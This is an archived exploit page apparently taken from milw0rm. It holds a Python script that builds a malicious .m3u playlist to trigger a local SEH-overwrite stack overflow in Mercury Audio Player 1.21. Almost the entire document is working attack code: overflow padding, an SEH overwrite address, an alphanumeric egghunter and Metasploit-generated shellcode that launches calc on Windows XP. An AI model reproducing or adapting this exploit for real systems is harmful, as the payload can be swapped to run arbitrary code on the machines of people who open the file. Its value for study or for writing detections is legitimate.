<html><head><title>Mercury Audio Player 1.21 (.m3u) Local Stack Overflow Exploit</title></head><pre>#usage: exploit.py
#Note : Exploit take about 30 seconds to work.
print &quot;**************************************************************************&quot;
print &quot; Mercury Audio Player 1.21 (.m3u) Seh Overwrite Exploit\n&quot;
print &quot; Refer: http://www.milw0rm.com/exploits/8578&quot;
print &quot; Exploit code: His0k4&quot;
print &quot; Tested on: Windows XP Pro SP3 (EN)\n&quot;
print &quot; greetz: TO ELITE ALGERIANS (TixxDZ),snakespc.com\n&quot;
print &quot;**************************************************************************&quot;

         	
buff = &quot;\x41&quot; * 16740
next_seh = &quot;\xEB\x06\x41\x42&quot;
seh = &quot;\xB8\x15\xD1\x72&quot; #msacm32.drv


# win32_exec -  EXITFUNC=seh CMD=calc Size=158 Encoder=PexFnstenvMov http://metasploit.com
shellcode = (
&quot;DZ27DZ27&quot;+&quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;
&quot;\x6a\x22\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x22\xd1\xdc&quot;
&quot;\x59\x83\xeb\xfc\xe2\xf4\xde\x39\x98\x59\x22\xd1\x57\x1c\x1e\x5a&quot;
&quot;\xa0\x5c\x5a\xd0\x33\xd2\x6d\xc9\x57\x06\x02\xd0\x37\x10\xa9\xe5&quot;
&quot;\x57\x58\xcc\xe0\x1c\xc0\x8e\x55\x1c\x2d\x25\x10\x16\x54\x23\x13&quot;
&quot;\x37\xad\x19\x85\xf8\x5d\x57\x34\x57\x06\x06\xd0\x37\x3f\xa9\xdd&quot;
&quot;\x97\xd2\x7d\xcd\xdd\xb2\xa9\xcd\x57\x58\xc9\x58\x80\x7d\x26\x12&quot;
&quot;\xed\x99\x46\x5a\x9c\x69\xa7\x11\xa4\x55\xa9\x91\xd0\xd2\x52\xcd&quot;
&quot;\x71\xd2\x4a\xd9\x37\x50\xa9\x51\x6c\x59\x22\xd1\x57\x31\x1e\x8e&quot;
&quot;\xed\xaf\x42\x87\x55\xa1\xa1\x11\xa7\x09\x4a\x21\x56\x5d\x7d\xb9&quot;
&quot;\x44\xa7\xa8\xdf\x8b\xa6\xc5\xb2\xbd\x35\x41\xd1\xdc\x59&quot;)

#[*] x86/alpha_mixed succeeded with size 126 (iteration=1)
egghunter=(
&quot;\x89\xe5\xda\xd9\xd9\x75\xf4\x5e\x56\x59\x49\x49\x49\x49\x49&quot;
&quot;\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a&quot;
&quot;\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32&quot;
&quot;\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49&quot;
&quot;\x45\x36\x4d\x51\x48\x4a\x4b\x4f\x44\x4f\x51\x52\x46\x32\x42&quot;
&quot;\x4a\x45\x52\x46\x38\x48\x4d\x46\x4e\x47\x4c\x45\x55\x51\x4a&quot;
&quot;\x44\x34\x4a\x4f\x48\x38\x47\x34\x50\x5a\x50\x32\x50\x37\x4c&quot;
&quot;\x4b\x4b\x4a\x4e\x4f\x43\x45\x4b\x5a\x4e\x4f\x42\x55\x4b\x57&quot;
&quot;\x4b\x4f\x4d\x37\x41\x41&quot;)

exploit = buff + shellcode + next_seh + seh + egghunter + &quot;\x90&quot;*7

try:
    out_file = open(&quot;exploit.m3u&quot;,'w')
    out_file.write(exploit+&quot;.mp3&quot;)
    out_file.close()
    raw_input(&quot;\nExploit file created!\n&quot;)
except:
    print &quot;Error&quot;

# milw0rm.com [2009-05-01]</pre></html>